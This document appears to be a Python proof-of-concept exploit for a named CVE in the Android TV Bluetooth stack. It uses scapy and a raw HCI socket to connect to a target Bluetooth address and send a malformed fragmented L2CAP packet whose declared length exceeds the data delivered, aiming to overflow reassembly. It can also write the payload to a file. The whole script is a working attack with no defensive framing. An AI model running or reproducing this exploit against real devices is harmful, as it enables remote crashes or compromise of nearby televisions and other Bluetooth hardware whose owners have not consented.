#!/usr/bin/env python3
"""CVE-2025-22448 — Android TV Bluetooth. L2CAP fragmented SDU with a declared
length larger than delivered -> reassembly overflow (Fluoride). Raw HCI."""
import sys, time, socket, struct
try:
    import fcntl
except ImportError:
    fcntl = None  # Windows: live HCI driver unavailable; build() still works
try:
    from scapy.layers.bluetooth import (BluetoothHCISocket, HCI_Hdr, HCI_ACL_Hdr,
        HCI_Command_Hdr, HCI_Cmd_Create_Conn, HCI_Event_Conn_Complete)
    SCAPY = True
except Exception:
    SCAPY = False

HCIDEVUP = 0x400448C9; EALREADY = 114

def str2ba(m): return bytes(int(x, 16) for x in reversed(m.split(":")))

def hci_up(dev):
    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    try: fcntl.ioctl(s.fileno(), HCIDEVUP, dev)
    except OSError as e:
        if e.errno != EALREADY: raise
    finally: s.close()

def build() -> bytes:
    return struct.pack("<HH", 0xFFFF, 0x0001) + bytes.fromhex("0a020300") + b"A" * 0x200

def exploit(target, dev=0):
    if not SCAPY: print("pip install 'scapy[bluetooth]'"); return
    hci_up(dev)
    s = BluetoothHCISocket(dev); s.ins.settimeout(0.5)
    s.send(HCI_Hdr(type=1) / HCI_Command_Hdr() / HCI_Cmd_Create_Conn(
        bdaddr=str2ba(target), packet_type=0xCC18, pscan_rep_mode=2,
        pscan_mode=0, clock_offset=0, role_switch=1))
    handle, t0 = None, time.time()
    while time.time() - t0 < 12:
        try: p = s.recv()
        except Exception: continue
        if p.haslayer(HCI_Event_Conn_Complete) and p[HCI_Event_Conn_Complete].status == 0:
            handle = p[HCI_Event_Conn_Complete].handle; break
    if handle is None: print("[!] no connection"); return
    payload = build()
    s.send(HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0b10, BC=0, len=len(payload)) / payload)
    print(f"[+] CVE-2025-22448 sent, handle=0x{handle:04x}")
    s.close()

def main():
    if len(sys.argv) > 1: exploit(sys.argv[1])
    else:
        from pathlib import Path
        Path("cve-2025-22448.bin").write_bytes(build()); print("[+] payload written")

if __name__ == "__main__":
    main()
